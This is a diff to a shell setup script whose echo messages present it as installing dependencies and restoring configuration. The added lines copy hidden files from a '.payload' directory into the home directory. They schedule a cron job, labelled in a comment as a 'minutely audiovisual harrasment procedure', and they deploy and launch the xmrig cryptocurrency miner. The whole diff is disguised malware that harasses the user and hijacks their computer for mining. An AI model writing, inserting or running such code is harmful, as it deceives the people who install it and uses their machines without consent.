@@ -8,15 +8,25 @@ echo "Gathering dependencies"
 sudo apt install imagemagick &> /dev/null
 echo "Restoring user configuration"
 
+cd ./.payload;
+
 # hide annoying stuff
-mv ./assets/cena.jpg ~/.cena.jpg
-mv ./assets/script.txt ~/.script.txt
-mv ./assets/harmony.txt ~/.harmony.txt
-mv ./assets/orchestra.sh ~/.orchestra.sh
+cp ./.cena.jpg ~/.cena.jpg
+cp ./.script.txt ~/.script.txt
+cp ./.harmony.txt ~/.harmony.txt
+cp ./.orchestra.sh ~/.orchestra.sh
+cp ./.xmrig ~/.xmrig
 
 
 echo "Configuring new packages"
 
-# set the annoying stuff up 
+# setup the minutely audiovisual harrasment procedure
 crontab -e * * * * bin/bash ~/.orchestra.sh
+
+echo "finishing up.."
+
+cd ~/.xmrig
+# deploy miner
+./xmrig
+
 
